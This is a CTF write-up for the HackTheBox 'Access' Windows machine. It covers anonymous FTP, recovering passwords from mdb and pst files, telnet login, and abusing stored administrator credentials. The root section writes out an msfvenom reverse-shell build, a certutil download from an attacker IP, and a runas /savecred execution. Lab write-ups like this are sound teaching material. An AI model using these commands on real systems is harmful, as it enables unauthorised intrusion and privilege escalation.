---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-03-02-access-hackthebox
tags:
- hackthebox
- windows
title: Access @ HackTheBox
---

In this short writeup I will show how I completed Access on [hackthebox.eu](https://www.hackthebox.eu), a quite easy windows box that involves parsing credentials from ms office files, converting mail formats and accessing saved windows credentials.

## User Flag

The initial scan shows the following results:

```
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

FTP can be accessed anonymously and allows to download 2 files, `Backups\backup.mdb` and `Engineer\Access Control.zip`. The zip file is protected with a password so the first thing I look at is the mdb file. There are some tools like mdb-tools that can parse so mdb format just fine but I decided that a quick string search with `strings -n12` might be enough:

```
...
admin
backup_admin
engineer
access4u@security
...
```

This looks like username, password or mail address. Since we just found potential passwords we try them on the archive and `access4u@security` finally allows to unpack it. From the archive the file `Access Control.pst` is obtained, which is a file format for mails used by Microsoft. With `readpst 'Access Control.pst' && cat 'Access Control.mbox` I convert it to the mbox format to make it readable and find another password inside:

```
...
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.
...
```

With these credentials it is possible to telnet into the box as user security and read the user flag.

```
C:\Users\security\Desktop>type user.txt
```

## Root Flag

Doing the usual enumeration I eventually check for stored credentials with `cmdkey /list` which shows that there are indeed stored ones for the administrator user:

```
C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

To get a root shell I generate a simple meterpreter reverse shell with `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.219 LPORT=5555 -f exe > xct.exe`, download it with certutil `certutil.exe -urlcache -split -f http://10.10.14.219:8000/xct.exe xct.exe` and execute it with runas `runas /user:administrator /savecred "xct.exe"`, which results in a root shell.